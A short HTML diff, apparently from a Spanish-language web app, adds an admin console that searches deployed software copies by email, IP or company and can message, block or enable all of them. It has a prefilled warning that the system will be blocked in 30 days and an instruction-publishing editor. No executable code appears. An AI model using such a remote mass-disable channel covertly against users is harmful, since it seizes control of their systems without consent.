@@ -15,8 +15,23 @@
     </form>
   </div>
   <div id="consola" style="display:none;">
+    <h2>Consola de Administración de Copias</h2>
+    <input type="text" id="busqueda" placeholder="Buscar por email, IP o empresa...">
+    <button onclick="buscarCopias()">Buscar</button>
+    <button onclick="actualizarCopias()">Actualizar</button>
+    <div id="copias"></div>
+    <div id="accionesGlobales">
+      <button onclick="instruccionGlobal('mensaje')">Mandar mensaje a todas</button>
+      <button onclick="instruccionGlobal('bloquear')">Bloquear todas</button>
+      <button onclick="instruccionGlobal('habilitar')">Habilitar todas</button>
+    </div>
+    <div id="editorMensaje" style="display:none;">
+      <textarea id="mensajeGlobal" rows="4" cols="50">En 30 días se bloqueará el sistema.</textarea><br>
+      <button onclick="enviarMensajeGlobal()">Enviar mensaje</button>
+      <button onclick="cerrarEditorMensaje()">Cancelar</button>
+    </div>
     <h2>Editor de instrucciones</h2>
-    <textarea id="editor" rows="18" cols="80"></textarea><br>
+    <textarea id="editor" rows="8" cols="80"></textarea><br>
     <button id="publicar">Publicar instrucciones</button>
     <div id="resultado"></div>
   </div>
